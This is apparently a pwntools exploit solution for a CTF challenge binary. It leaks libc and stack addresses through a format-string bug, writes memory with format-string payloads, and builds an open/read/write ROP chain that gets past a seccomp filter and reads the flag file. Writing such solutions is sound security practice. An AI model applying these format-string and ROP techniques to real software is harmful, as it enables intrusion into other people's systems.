#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challenges.ctf.compfest.id', 9008

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x4017bd
break *0x4019b5
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0001: 0x15 0x13 0x00 0x00000000  if (A == read) goto 0021
#  0002: 0x15 0x12 0x00 0x00000001  if (A == write) goto 0021
#  0003: 0x15 0x11 0x00 0x00000002  if (A == open) goto 0021
#  0004: 0x15 0x10 0x00 0x00000003  if (A == close) goto 0021
#  0005: 0x15 0x0f 0x00 0x00000005  if (A == fstat) goto 0021
#  0006: 0x15 0x0e 0x00 0x00000008  if (A == lseek) goto 0021
#  0007: 0x15 0x0d 0x00 0x00000009  if (A == mmap) goto 0021
#  0008: 0x15 0x0c 0x00 0x0000000a  if (A == mprotect) goto 0021
#  0009: 0x15 0x0b 0x00 0x0000000b  if (A == munmap) goto 0021
#  0010: 0x15 0x0a 0x00 0x0000000c  if (A == brk) goto 0021
#  0011: 0x15 0x09 0x00 0x00000011  if (A == pread64) goto 0021
#  0012: 0x15 0x08 0x00 0x00000012  if (A == pwrite64) goto 0021
#  0013: 0x15 0x07 0x00 0x0000004e  if (A == getdents) goto 0021
#  0014: 0x15 0x06 0x00 0x000000ca  if (A == futex) goto 0021
#  0015: 0x15 0x05 0x00 0x000000d9  if (A == getdents64) goto 0021
#  0016: 0x15 0x04 0x00 0x000000e7  if (A == exit_group) goto 0021
#  0017: 0x15 0x03 0x00 0x00000101  if (A == openat) goto 0021
#  0018: 0x15 0x02 0x00 0x00000106  if (A == newfstatat) goto 0021
#  0019: 0x15 0x01 0x00 0x0000013e  if (A == getrandom) goto 0021
#  0020: 0x06 0x00 0x00 0x00000000  return KILL
#  0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b')', b'N')
    io.sendlineafter(b'see:', b'%12$p')
    io.recvuntil(b'file ')
    libc.address = int(io.recvuntil(b' is', drop=True), 16) - libc.sym['_IO_2_1_stdout_']

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b')', b'N')
    io.sendlineafter(b'see:', b'%26$p')
    io.recvuntil(b'file ')
    stack = int(io.recvuntil(b' is', drop=True), 16)
    rip = stack + 0x8
    writeable = elf.bss()+0x100

    # flag-7c76921b144b830737737d5d7f6dd4d7.txt
    # io.sendlineafter(b'>', b'2')
    # io.sendlineafter(b')', b'N')
    # io.sendlineafter(b'see:', fmtstr_payload(10, {writeable: b'.\x00'}, write_size='short'))

    flagname = b'flag-7c76921b144b830737737d5d7f6dd4d7.txt'
    for i, b in enumerate(flagname):
        io.sendlineafter(b'>', b'2')
        io.sendlineafter(b')', b'N')
        io.sendlineafter(b'see:', fmtstr_payload(10, {writeable+i: b}, write_size='short'))
        log.info("writing %#x => %#s", writeable+1, chr(b))

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx_r12 = rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    syscall = rop.find_gadget(['syscall', 'ret'])[0]

    payload = [
        pop_rdi,
        writeable,
        pop_rsi,
        0x0,
        pop_rdx_r12,
        0x0,
        0x0,
        pop_rax,
        0x2,
        syscall,

        # pop_rdi,
        # 0x11,
        # pop_rsi,
        # stack - 0x100,
        # pop_rdx_r12,
        # 0x100,
        # 0x0,
        # pop_rax,
        # 78,
        # syscall,


        pop_rdi,
        0x11,
        pop_rsi,
        stack - 0x100,
        pop_rdx_r12,
        0x100,
        0x0,
        pop_rax,
        0x0,
        syscall,

        pop_rdi,
        0x1,
        pop_rax,
        0x1,
        syscall,
    ]

    for i, p in enumerate(payload):
        io.sendlineafter(b'>', b'2')
        io.sendlineafter(b')', b'N')
        assert(len(payload) <= 64)
        io.sendlineafter(b'see:', fmtstr_payload(10, {rip+(i*8): p}, write_size='short'))
        log.info("writing %#x => %#x", rip+(i*8), p)

    io.sendlineafter(b'>', b'4')

    log.success("libc base: %#x", libc.address)
    log.success("rip: %#x", rip)
    log.success("writeable: %#x", writeable)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
